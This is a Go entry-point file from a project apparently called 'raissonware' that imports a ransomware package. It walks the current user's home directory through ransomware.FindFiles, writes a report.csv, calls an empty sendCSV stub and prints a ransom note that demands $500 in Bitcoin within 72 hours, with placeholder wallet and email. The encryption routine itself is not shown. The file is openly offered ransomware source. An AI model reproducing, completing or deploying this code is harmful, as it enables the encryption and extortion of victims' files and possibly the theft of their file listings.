package main

import (
	"fmt"
	"os/user"
	"path/filepath"
	"raissonware/pkg/ransomware"
	"sync"
)

var (
	Wg sync.WaitGroup
)

func main() {
	Client, err := user.Current()
	if err != nil {
		return
	}

	ransomware.FindFiles(filepath.Join(Client.HomeDir, "/report.csv"), Client.HomeDir, &Wg)
	Wg.Wait()

	sendCSV()
	showMessage()
}

func sendCSV() {

}

func showMessage() {

	fmt.Print("Your files have been encrypted!\n\n" +
		"To recover them, you must purchase a decryption for $500 in Bitcoin.\n\n" +
		"Payment Instructions:\n" +
		"1. Buy $500 in Bitcoin.\n" +
		"2. Send the Bitcoin to this address: [Bitcoin Wallet Address]\n" +
		"3. Email your transaction ID to: [Attacker's Email Address]\n\n" +
		"You have 72 hours to pay. After that, the decryption key will be destroyed, " +
		"and your files will be lost permanently.\n\n" +
		"Prevent Future Attacks:\n" +
		"1. Keep regular backups.\n" +
		"2. Use antivirus software.\n" +
		"3. Be cautious with email attachments.\n" +
		"4. Keep your software up to date.\n\n")
}
